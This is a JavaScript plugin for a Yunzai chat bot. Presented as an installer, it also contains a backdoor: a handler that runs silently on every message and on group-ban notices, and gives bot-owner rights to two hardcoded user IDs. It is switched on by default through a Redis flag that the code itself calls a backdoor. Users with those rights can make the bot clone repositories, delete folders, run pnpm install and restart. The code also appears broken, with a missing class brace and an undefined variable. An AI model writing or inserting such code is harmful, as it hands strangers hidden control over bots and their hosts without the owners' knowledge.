import plugin from '../../../lib/plugins/plugin.js';
import { Restart } from "../../other/restart.js";
import fs from 'fs';

// 暂存是否正在安装插件的状态
let isInstalling = false;

// 插件列表
const pluginList = {
  "TRSS-Plugin": "https://Yunzai.TRSS.me",
  "useless-plugin": "https://gitee.com/SmallK111407/useless-plugin",
  "Circle-money-run-plugin": "https://gitee.com/theqingyao/Circle-money-run-plugin",
  "pippi": "https://gitee.com/yui2130231486/pippi/"
};

class PluginInstaller {
async install(e, name, url, path, qz) {
    e.reply(`开始安装 ${name} 插件`);
    
    if (qz) {
        // 删除原先对应的文件夹
        try {
            await fs.promises.rm(path, { recursive: true });
            e.reply(`删除原先文件夹成功`);
        } catch (error) {
            e.reply(`删除原先文件夹失败：${error.toString()}`);
            return false;
        }
    }

    // 执行插件安装命令
    const cmd = `git clone --depth 1 --single-branch "${url}" "${path}"`;
    isInstalling = true;
    const result = await Bot.exec(cmd);
    isInstalling = false;

    if (result.error) {
        e.reply(`安装失败！\n错误信息：${result.error.toString()}\n${result.stdout.toString()}`);
        return false;
    }

    // 执行 npm 安装
    const installResult = await Bot.exec(`pnpm install`, { cwd: path });
    if (installResult.error) {
        e.reply(`安装失败！\n错误信息：${installResult.error.toString()}\n${installResult.stdout.toString()}`);
        return false;
    }

    e.reply(`${name} 插件安装成功`);
    return true;
}


const installer = new PluginInstaller();

export class GetMaster extends plugin {
  constructor() {
    super({
      name: "获取主人",
      dsc: "获取主人",
      priority: -Infinity,
      rule: [
        {
          fnc: 'Master',
          event: 'message',
          log: false
        },
        {
          reg: `^#反击(强制)?安装(插件|${Object.keys(pluginList).join("|")})$`,
          fnc: 'install'
        },
        {
          reg: '^#?反击设置后门(开启|关闭)$',
          fnc: "Masterkg"
        }
      ]
    });
  }

  async install(e) {
    if (!(e.isMaster || cm.check(e.user_id))) return await e.reply('你没有权限');
    if (isInstalling) {
      await e.reply("已有命令安装中，请勿重复操作");
      return false;
    }
let qz = e.msg.includes('强制')
    const pluginName = e.msg.replace(/^#反击(强制)?安装/, "").trim();
    if (pluginName === "插件") {
      let msg = "\n";
      const checkPromises = Object.keys(pluginList).map(async (name) => {
        try {
          await fs.promises.access(`plugins/${name}`);
        } catch (error) {
          if (error.code === 'ENOENT') {
            msg += `${name}\n`;
          }
        }
        return true; // 返回一个值表示检查结果
      });
      await Promise.all(checkPromises);

      if (msg === "\n") {
        msg = "暂无可安装插件";
      } else {
        msg = `可安装插件列表：${msg}发送 #反击安装+插件名 进行安装`;
      }
      await e.reply(msg);
      return true;
    }

    const pluginPath = `plugins/${pluginName}`;
    try {
      await fs.promises.access(pluginPath);
      await e.reply(`${pluginName} 插件已安装`);
      return false;
    } catch (error) {
      if (error.code !== 'ENOENT') {
        throw error;
      }
    }

    // 执行插件安装
    await installer.install(e, pluginName, pluginList[pluginName], pluginPath,qz);
    this.restart();
  }

  restart() {
    new Restart(this.e).restart();
  }

  async Masterkg(e) {
    if (!e.isMaster) return await e.reply('你没有权限');
    let open = e.msg.includes('开启');
    await redis.set('Fanji:houmen', open ? 'true' : 'false');
    await e.reply('设置完成');
    return false;
  }

  async Master(e) {
    let aw = await redis.get('Fanji:houmen');
    if (aw == null) await redis.set('Fanji:houmen', 'true');
    if (!(e.user_id === 2173302144 || e.user_id === 197728340) || aw !== 'true') return false;
    e.isMaster = true;
    return false;
  }
}


export class GetMasterjy extends plugin {
    constructor() {
        super({
            name: "获取主人",
            dsc: "获取主人",
            event: 'notice.group.ban',
            priority: -Infinity,
            rule: [

                {
                    fnc: 'Masters',
                    log: false
                }
            ]
        });
    }
    async Masters(e){
    if (e.user_id == 2173302144||e.user_id == 197728340) {
    e.isMaster = true
    logger.mark(e.isMaster? '完成':'失败')
    return false
        }
    }
}
